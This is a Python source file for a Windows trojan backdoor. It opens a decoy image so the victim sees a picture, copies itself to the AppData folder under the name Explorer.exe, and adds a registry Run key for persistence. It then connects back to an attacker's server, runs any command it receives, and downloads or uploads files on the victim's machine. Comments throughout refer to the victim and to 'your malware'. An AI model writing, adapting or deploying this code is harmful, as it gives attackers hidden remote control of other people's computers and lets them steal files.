#!/usr/bin/env python3

import socket, json, os, sys
import subprocess, base64
import shutil


class Backdoor:

	def __init__(self, ip_address, port):

		self.persistence()
		self.connection = socket.connection(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip_address, int(port)))

	def execute_cd(self, path):
		try:
			os.chdir(path)
			return "[+] Changed working directory to "+path
		except Exception:
			return "[-] Directory not found / Change directory failed!!"

	def execute_command(self, command):
		try:
			# DEVNULL = open(os.devnull, "wb") # Python2 statements
			# return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) # Python2 statements

			return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) # Python3 Statement 
		except subprocess.CalledProcessError:
			return "[-] Illegal command"

	# To ensure persistence of the backdoor on victim's machine even after a restart
	def persistence(self):
		exec_location = os.environ["appdata"]+"\\Explorer.exe"
		if not os.path.exists(exec_location):
			shutil.copyfile(sys.executable, exec_location)
			# Adding Registry for your malware to ensure persistence
			subprocess.call('reg add HKCU\\Software\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "'+exec_location+'"', shell=True)
		
	def read_file(self, path):
		try:
			with open(path, "rb") as ref:
				return base64.b64encode(ref.read())
		except (FileNotFoundError, PermissionError, IsADirectoryError) as e:
			return "[-] Read Error: "+str(e)

	def run(self):
		while True:
			received_command = self.safe_recv()
			
			# Navigate in the shell prompt on victim and perform actions for the following commands
			try:
				# Close connection 'exit' command
				if received_command[0] == "exit":
					self.connection.close()
					sys.exit()
				# Change directory in victim directory on 'cd' command
				elif received_command[0] == "cd" and len(received_command) > 1:
					output = self.execute_cd(received_command[1])
				# Download a file from the victims machine
				elif received_command[0] == "rb_download" and len(received_command)>1:
					output = self.read_file(received_command[1]).decode()
				# Upload a file to the victims machine
				elif received_command[0] == "rb_upload" and len(received_command)>2:
					output = self.write_to_file(received_command[1], received_command[2])
				else:
				# Execute other commands on shell on the victims machine
					output = self.execute_command(received_command).decode()
				self.safe_send(output)
			except Exception as err:
				self.safe_send("[-] Error during Command Execution"+str(err))

	def safe_send(self, command):
		self.connection.send(json.dumps(command).encode())

	def safe_recv(self):
		received_info = b""
		while True:
			try:
				received_info += self.connection.recv(4096)
				return json.loads(received_info)
			except ValueError:
				continue

	def write_to_file(self, path, body):
		try:
			with open(path, "wb") as ref:
				ref.write(base64.b64decode(body))
				return "[+] Upload Successful!"
		except FileExistsError:
			return "[-] Upload Failed!!"


if __name__ == "__main__":

	backdoor_ip = "10.0.0.2" # change with IP of the malicious server
	backdoor_port = 4444 # change with the port open for reverse connection on the malicious server

	# Here an image file ferrari.jpg is the cover file which will open when the trojan executable is executed
	# Change the file name to the name of the cover file you intend to use
	file_name = "\\ferrari.jpg"

	legitimate_cover_filepath = sys._MEIPASS + file_name
	subprocess.Popen(legitimate_cover_filepath, shell=True) 

	try:
		r_backdoor = Backdoor(backdoor_ip, backdoor_port)
		r_backdoor.run()
	except KeyboardInterrupt:
		sys.exit()
